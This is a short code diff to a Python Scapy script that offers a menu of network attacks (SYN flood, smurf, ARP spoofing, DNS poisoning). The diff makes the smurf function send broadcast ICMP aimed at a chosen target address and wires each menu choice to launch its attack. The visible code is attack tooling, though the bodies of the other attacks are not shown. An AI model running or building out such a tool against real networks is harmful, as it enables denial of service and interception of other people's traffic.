@@ -11,8 +11,8 @@ def syn_flood():
 
 
 def smurf():
-    msg = Ether(dst=BROADCAST) / IP() / ICMP()
-    sendp(msg, count=25)
+    msg = Ether(dst=BROADCAST) / IP(dst=ip_address) / ICMP()
+    sendp(msg, count=20)
 
 
 def dns_poisoning():
@@ -43,7 +43,14 @@ def main():
     while True:
         menu()
         choice = int(input("Your choice: "))
-        CHOICES[choice]
+        if choice == 1:
+            syn_flood()
+        elif choice == 2:
+            smurf()
+        elif choice == 3:
+            arp_spoofing()
+        elif choice == 4:
+            dns_poisoning()
 
 
 
